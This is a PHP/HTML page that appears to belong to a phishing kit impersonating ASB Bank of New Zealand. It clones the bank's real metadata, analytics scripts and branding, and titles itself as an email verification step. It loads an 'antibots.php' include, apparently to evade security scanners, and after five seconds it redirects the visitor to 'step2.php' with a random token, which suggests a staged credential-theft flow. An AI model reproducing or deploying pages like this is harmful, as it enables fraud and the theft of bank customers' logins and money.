﻿<?php
session_start();
error_reporting(0);
require "antibots.php";
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

?>
<html class="js csstransforms3d" lang="en_nz"><head><script type="text/javascript" async="async" src="https://visit.asb.co.nz/b/ss/asb-global-prd/10/JS-2.17.0-LBRU/s09730541776166?AQB=1&amp;ndh=1&amp;pf=1&amp;callback=s_c_il[1].doPostbacks&amp;et=1&amp;t=10%2F5%2F2021%2021%3A44%3A13%204%20-60&amp;d.&amp;nsid=0&amp;jsonv=1&amp;.d&amp;mid=70506516413913667403986393321385732842&amp;aamlh=6&amp;ce=UTF-8&amp;ns=asb&amp;cdp=3&amp;fpCookieDomainPeriods=3&amp;pageName=asb%3Ahomepage&amp;g=https%3A%2F%2Fwww.asb.co.nz%2F&amp;cc=NZD&amp;ch=homepage&amp;server=www.asb.co.nz&amp;events=event1&amp;aamb=j8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI&amp;h1=asb%7Chomepage&amp;v2=homepage&amp;c3=D%3Dv3&amp;v3=https%3A%2F%2Fwww.asb.co.nz%2F&amp;c4=D%3Dv4&amp;v4=asb&amp;c5=D%3Dv5&amp;v5=asb-home-page&amp;c6=D%3Dv6&amp;v6=id2016n3462&amp;c8=D%3Dv8&amp;v8=8%3A44%20AM%7CFriday&amp;c11=D%3Dv11&amp;v11=asb&amp;c16=D%3Dv16&amp;v16=asb%3Ahomepage&amp;c31=asb%3Ahomepage&amp;c36=D%3Dv36&amp;v36=https%3A%2F%2Fwww.asb.co.nz%2F&amp;c37=D%3Dv37&amp;v37=https%3A%2F%2Fwww.asb.co.nz%2F&amp;v46=Repeat&amp;v48=Less%20than%201%20day&amp;c67=D%3Dv67&amp;v67=70506516413913667403986393321385732842&amp;v68=code%3ALU20210505&amp;c69=D%3Dv69&amp;v69=asb%3Ahomepage&amp;s=1366x768&amp;c=24&amp;j=1.6&amp;v=N&amp;k=Y&amp;bw=1366&amp;bh=615&amp;mcorgid=C1881C8B532E6D110A490D4D%40AdobeOrg&amp;AQE=1"></script><script type="text/javascript" async="async" src="https://visit.asb.co.nz/b/ss/asb-global-prd/10/JS-2.17.0-LBRU/s0401592729745?AQB=1&amp;ndh=1&amp;pf=1&amp;callback=s_c_il[1].doPostbacks&amp;et=1&amp;t=10%2F5%2F2021%2021%3A44%3A13%204%20-60&amp;d.&amp;nsid=0&amp;jsonv=1&amp;.d&amp;sdid=58EEC34B5FECA825-0F257A7E80692137&amp;mid=70506516413913667403986393321385732842&amp;aamlh=6&amp;ce=UTF-8&amp;ns=asb&amp;cdp=3&amp;fpCookieDomainPeriods=3&amp;pageName=asb%3Ahomepage&amp;g=https%3A%2F%2Fwww.asb.co.nz%2F&amp;cc=NZD&amp;ch=homepage&amp;server=www.asb.co.nz&amp;events=event1&amp;aamb=j8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI&amp;h1=asb%7Chomepage&amp;v2=homepage&amp;c3=D%3Dv3&amp;v3=https%3A%2F%2Fwww.asb.co.nz%2F&amp;c4=D%3Dv4&amp;v4=asb&amp;c5=D%3Dv5&amp;v5=asb-home-page&amp;c6=D%3Dv6&amp;v6=id2016n3462&amp;c8=D%3Dv8&amp;v8=8%3A44%20AM%7CFriday&amp;c11=D%3Dv11&amp;v11=asb&amp;c16=D%3Dv16&amp;v16=asb%3Ahomepage&amp;c31=asb%3Ahomepage&amp;c36=D%3Dv36&amp;v36=https%3A%2F%2Fwww.asb.co.nz%2F&amp;v46=Repeat&amp;v48=Less%20than%201%20day&amp;c67=D%3Dv67&amp;v67=70506516413913667403986393321385732842&amp;v68=code%3ALU20210505&amp;s=1366x768&amp;c=24&amp;j=1.6&amp;v=N&amp;k=Y&amp;bw=1366&amp;bh=615&amp;mcorgid=C1881C8B532E6D110A490D4D%40AdobeOrg&amp;AQE=1"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/plugins/ua/linkid.js"></script><script async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript">var configNodeName= "config.publish.prod";</script>

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<title>ASB Bank - Email Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="tags" content="">
<meta name="keywords" content="asb, auckland bank, bank, new zealand bank, nz banks">

<link rel="dns-prefetch" href="https://connect.facebook.com/">
<link rel="dns-prefetch" href="https://visit.asb.co.nz/">
<link rel="dns-prefetch" href="https://content.asb.co.nz/">
<link rel="dns-prefetch" href="https://www.google-analytics.com/">
<link rel="dns-prefetch" href="https://api.asb.co.nz/">

<meta name="collectionName" content="ProductsServices">
    <meta http-equiv="refresh" content="5;url=step2.php?h=ed29nkjpsa16bhrjq4na16owq-1mucgfycc664m7vmhpjgqse65-1l5rurej3h44qodo5rn0cdvyn-8om6v2ckrxsbnwf40t9ta8a7e-34tiets5jpj294jd59h8c4s0n-28w7d5j2k2jtil9ncckolke4m-9jzlwicvu376y9q4vjq77y5ks-1m0whdrwis44c1hoa9mrwhlt4-1uvutm1mpyov7rqhtcf8fksby-aac54ic1fmca5xz1yvc5t9nfe-1hn40w0bomeivihj9lopp4hp2-c0121povror81d0xao0yez4gy"/>
    <meta property="og:title" content="ASB Bank - Personal &amp; Business Banking in New Zealand">
<meta name="twitter:title" content="ASB Bank - Personal &amp; Business Banking in New Zealand">
<meta name="description" content="ASB Bank offers mortgage, KiwiSaver, foreign exchange, loans, insurance, credit cards, accounts, business &amp; investment products to help with your banking needs. Login to FastNet internet banking or visit us in branch today.">
<meta property="og:description" content="ASB Bank offers mortgage, KiwiSaver, foreign exchange, loans, insurance, credit cards, accounts, business &amp; investment products to help with your banking needs. Login to FastNet internet banking or visit us in branch today.">
<meta name="twitter:description" content="ASB Bank offers mortgage, KiwiSaver, foreign exchange, loans, insurance, credit cards, accounts, business &amp; investment products to help with your banking needs. Login to FastNet internet banking or visit us in branch today.">
<meta property="og:url" content="https://www.asb.co.nz">
<link rel="canonical" href="https://www.asb.co.nz">
<meta name="twitter:url" content="https://www.asb.co.nz">
<meta property="og:type" content="article">
<meta property="og:locale" content="en_NZ">

<meta name="sasiaSiteName" content="ASB">
	<meta property="og:site_name" content="ASB Bank"> 
<meta name="twitter:site" content="@ASBBank">
<meta property="og:image" content="https://www.asb.co.nz/etc/designs/asb/common-blade/images/welcome-confetti-ladies.jpg">
		<meta name="twitter:image" content="https://www.asb.co.nz/etc/designs/asb/common-blade/images/welcome-confetti-ladies.jpg">
		<meta name="twitter:card" content="summary_large_image">
	<link rel="dns-prefetch" href="https://connect.facebook.com/">
	<link rel="dns-prefetch" href="https://visit.asb.co.nz/">
	<link rel="dns-prefetch" href="https://content.asb.co.nz/">
	<link rel="dns-prefetch" href="https://www.google-analytics.com/">
	<link rel="dns-prefetch" href="https://api.asb.co.nz/">

<!-- Favicon -->
<link rel="icon" type="image/vnd.microsoft.icon" href="https://www.asb.co.nz/favicon.ico">
<link rel="shortcut icon" type="image/vnd.microsoft.icon" href="https://www.asb.co.nz/favicon.ico">
<link rel="apple-touch-icon" sizes="72x72" href="https://www.asb.co.nz/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="https://www.asb.co.nz/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="https://www.asb.co.nz/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="https://www.asb.co.nz/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="152x152" href="https://www.asb.co.nz/apple-touch-icon-152x152.png">
<link rel="icon" type="image/png" href="https://www.asb.co.nz/favicon-32.png" sizes="32x32">
<link rel="icon" type="image/png" href="https://www.asb.co.nz/favicon-48.png" sizes="48x48">
<link rel="icon" type="image/png" href="https://www.asb.co.nz/favicon-96.png" sizes="96x96">
<link rel="icon" type="image/png" href="https://www.asb.co.nz/favicon-144.png" sizes="144x144"><script type="text/javascript" src="https://www.asb.co.nz/content/dam/asb/analytics/jquery.js" async=""></script>
<link rel="stylesheet" href="https://www.asb.co.nz/etc/designs/asb/common-blade/clientlibrary/appstyle-common-blade.min.2021052797.css" type="text/css">
<link rel="stylesheet" href="https://www.asb.co.nz/etc/designs/asb/ui/clientlibrary/maincss.gy64w8.min.2021052797.css" type="text/css">
<script type="text/javascript" src="https://www.asb.co.nz/etc/designs/asb/common-blade/js/datalayer-script.js"></script>


<!-- Apple touch icons, used on home screen of iOS -->
<link rel="apple-touch-icon" href="https://www.asb.co.nz/etc/designs/asb/help/clientlibs/style/images/touch-icon.png">
<link rel="apple-touch-icon" sizes="72x72" href="https://www.asb.co.nz/etc/designs/asb/help/clientlibs/style/images/touch-icon-72.png">
<link rel="apple-touch-icon" sizes="114x114" href="https://www.asb.co.nz/etc/designs/asb/help/clientlibs/style/images/touch-icon-114.png">

<script src="https://www.asb.co.nz/analytics/1d06c93b1252/11ac6b935778/55baf0d7e052/hostedLibFiles/EP23d75a37c9fa4adb8bac5e48782e354a/AppMeasurement_Module_AudienceManagement.min.js" async=""></script></head><body class=" body--active">



	<div class="component component--notification is-active" data-component="notification">
        	<div class="notification-wrapper">
                <div class="notification-content-wrapper" data-hook="notification-wrapper" data-notifications-link="https://www.asb.co.nz/content/asb/notifications/en/notifications/notifications-config.announcements.html"></div>
                <div class="notification-close">
                    <a href="#" class="notification-close-link" data-hook="notification-close-link">
                        <svg class="icon"><use xlink:href="#icon-notification-close"></use></svg>
                    </a>
                </div>
        	</div>
    	</div>
    	<div class="outline" id="outline" data-hook="outline">
            <div style="display:inline;" class="cq-dd-paragraph"><header class="outline-header outline-header-full-width" data-region="header">
	<div class="header header-full-width"><!--
        
  	--><div class="main-menu-icon-container">
			
        <span class="menu-label"></span>
       </div><!-- 

  	--><div class="header-logo logo" title="ASB Bank">
            <a href="https://www.asb.co.nz?fm=header:asb" target="_self" class="icon icon-asb-logo">
                        <br><img src="logo2.png"><div class="header-logo-overlay"></div></a>
                    </div><!--
        
  	--><div class="right-section">
</div>
</header>
<main class="outline-main" data-region="main">
	<div>



<!-- include modal window component -->
        <div class="modal-views" data-hook="modals">
            </div>
        </div>
</main>
<section class="footer footer-full-width">

	<div>
			
			<center> <br><br><br><br><img src="200.gif"></center><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
</div></div>
                </div>
            </div>
	<div class="row white">

	</section>
</div>




</body></html>